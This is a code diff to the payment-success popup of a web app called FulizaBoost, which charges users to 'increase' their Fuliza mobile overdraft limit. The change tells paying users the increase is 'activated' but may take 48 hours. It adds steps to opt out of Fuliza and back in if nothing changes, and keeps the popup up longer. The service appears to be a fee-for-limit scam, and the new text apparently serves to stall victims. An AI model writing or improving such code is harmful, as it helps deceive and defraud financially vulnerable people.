@@ -1534,44 +1534,74 @@
         const paymentSuccess = await checkPaymentStatus(paymentReference);
         
         if (paymentSuccess) {
-          // Success - MOBILE OPTIMIZED
-          await Swal.fire({
-            title: 'Payment Successful!',
-            html: `
-              <div style="text-align: center; padding: 0 8px;">
-                <div class="success-icon">
-                  <i class="fas fa-check-circle"></i>
-                </div>
-                <p><strong>Your Fuliza limit has been increased!</strong></p>
-                <p style="color: #666; margin-top: 8px;">
-                  New limit: <strong style="color: #2563eb;">Ksh ${selectedLoan.amount.toLocaleString()}</strong>
-                </p>
-                <p style="color: #666; margin-top: 5px; font-size: 0.85rem;">
-                  You can now use your increased limit immediately
-                </p>
-                <p style="color: #666; margin-top: 5px; font-size: 0.8rem;">
-                  Thank you for using FulizaBoost!
-                </p>
-              </div>
-            `,
-            icon: false,
-            confirmButtonText: 'Continue',
-            confirmButtonColor: '#2563eb',
-            timer: 4000,
-            timerProgressBar: true,
-            customClass: {
-              popup: 'swal2-popup-mobile'
-            }
-          });
-          
-          // Clear storage and reset
-          localStorage.removeItem('fulizaBoostData');
-          resetButton();
-          resetSelections();
-          
-        } else {
-          throw new Error('Payment not confirmed');
-        }
+  // Success - MOBILE OPTIMIZED
+  await Swal.fire({
+    title: 'Payment Successful!',
+    html: `
+      <div style="text-align: center; padding: 0 8px;">
+        <div class="success-icon">
+          <i class="fas fa-check-circle"></i>
+        </div>
+        <p><strong>Your Fuliza limit increase has been activated!</strong></p>
+        <p style="color: #666; margin-top: 8px;">
+          New limit: <strong style="color: var(--primary);">Ksh ${selectedLoan.amount.toLocaleString()}</strong><br>
+          <small style="color: var(--text-muted);">The update may take up to 48 hours to complete</small>
+        </p>
+        
+        <!-- Enhanced note with better styling matching theme -->
+        <div style="
+          background: linear-gradient(135deg, rgba(37, 99, 235, 0.08) 0%, rgba(124, 58, 237, 0.05) 100%);
+          border-left: 4px solid var(--accent);
+          padding: 14px;
+          border-radius: var(--radius-sm);
+          margin-top: 16px;
+          text-align: left;
+          font-size: 0.85rem;
+          color: var(--text-dark);
+          line-height: 1.5;
+          border: 1px solid var(--border-color);
+        ">
+          <div style="
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            margin-bottom: 6px;
+          ">
+            <i class="fas fa-exclamation-circle" style="color: var(--accent); font-size: 1rem;"></i>
+            <strong style="color: var(--accent);">Important Note:</strong>
+          </div>
+          <div style="padding-left: 26px;">
+            If your limit does not update within 48 hours, please:<br>
+            1. Dial *234# on your phone<br>
+            2. Select "Opt Out" from Fuliza<br>
+            3. Wait 2 minutes, then dial *234# again<br>
+            4. Select "Opt In" to activate your new limit
+          </div>
+        </div>
+        
+        <p style="color: var(--text-muted); margin-top: 12px; font-size: 0.85rem;">
+          Thank you for using FulizaBoost!
+        </p>
+      </div>
+    `,
+    icon: false,
+    confirmButtonText: 'Continue',
+    confirmButtonColor: 'var(--primary)',
+    timer: 10000,
+    timerProgressBar: true,
+    customClass: {
+      popup: 'swal2-popup-mobile'
+    }
+  });
+  
+  // Clear storage and reset
+  localStorage.removeItem('fulizaBoostData');
+  resetButton();
+  resetSelections();
+  
+} else {
+  throw new Error('Payment not confirmed');
+}
         
       } catch (error) {
         console.error('Payment error:', error);
